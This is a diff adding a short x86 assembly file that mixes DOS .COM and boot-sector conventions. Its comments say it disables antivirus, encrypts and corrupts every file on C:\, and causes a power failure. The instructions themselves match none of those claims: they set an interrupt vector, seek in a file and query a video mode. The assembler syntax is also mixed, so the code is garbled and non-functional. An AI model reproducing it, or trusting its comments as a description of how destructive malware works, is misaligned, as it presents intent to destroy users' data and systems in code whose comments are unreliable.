@@ -1,0 +1,30 @@
+; E
+
+ORG 100h
+
+start:
+    ; Disable antivirus and security software
+    mov ax, 2529h
+    mov bx, 0000h
+    int 21h
+
+    ; Encrypt and corrupt all files on the system
+    mov ah, 42h
+    mov dx, offset files
+    int 21h
+
+    ; E
+    mov ah, 9
+    mov dx, offset message
+    int 21h
+
+    ; Trigger system-wide power failure
+    mov ax, 4F03h
+    mov bx, 0
+    int 10h
+
+message db "EEEEEEEEEEEEEEEEEEEEEEEEEE", 0
+files db "C:\*.*", 0
+
+times 510-($-$$) db 0
+dw 0AA55h
